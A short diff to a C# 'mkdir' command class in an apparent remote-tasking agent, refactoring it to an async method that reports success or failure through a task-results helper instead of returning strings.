@@ -6,6 +6,7 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.IO;
+using Engineer.Functions;
 
 namespace Engineer.Commands
 {
@@ -13,22 +14,23 @@ namespace Engineer.Commands
     {
         public override string Name => "mkdir";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             task.Arguments.TryGetValue("/path", out string path);
             if (Directory.Exists(path))
             {
-                return "error: " + "Directory already exists";
+                Tasking.FillTaskResults("error: " + "Directory already exists",task,EngTaskStatus.FailedWithWarnings);
+                return;
             }
             //try to create directory 
             try
             {
                 Directory.CreateDirectory(path);
-                return "Directory created";
+                Tasking.FillTaskResults("Directory created",task,EngTaskStatus.Complete);
             }
             catch (Exception e)
             {
-                return "error: " + e.Message;
+                Tasking.FillTaskResults("error: " + e.Message,task,EngTaskStatus.Failed);
             }
 
         }
